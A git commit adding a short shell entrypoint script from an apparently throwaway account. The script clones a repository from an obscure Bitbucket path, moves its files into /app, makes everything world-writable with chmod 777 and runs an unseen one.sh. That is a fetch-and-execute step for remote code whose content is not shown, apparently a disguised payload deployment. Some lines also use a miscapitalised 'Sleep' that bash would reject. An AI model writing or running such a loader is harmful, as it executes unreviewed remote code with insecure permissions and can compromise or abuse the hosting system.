21357d7d839b388e81b013092e8dac54636a78a5
Sreda nuiz <131594336+nixegohshs5f4ef6vuun43f6@users.noreply.github.com>
2024-08-20 19:02:46 +0530

    Create entrypoint.sh

---
+++ entrypoint.sh
@@ -0,0 +1,25 @@
+#!/bin/bash
+
+Sleep 10
+
+git clone https://rameshkumar015@bitbucket.org/bauw61625c28du3v25wrc28wh2g26wve/0001-of-01.git
+
+sleep 10
+
+chmod 777 /app/0001-of-01
+
+sleep 10
+
+cd /app/0001-of-01 && mv /app/0001-of-01/* /app/
+
+Sleep 10
+
+rm -fr /app/0001-of-01
+
+Sleep 10
+
+chmod 777 /app/*
+
+sleep 10
+
+cd /app && ./one.sh
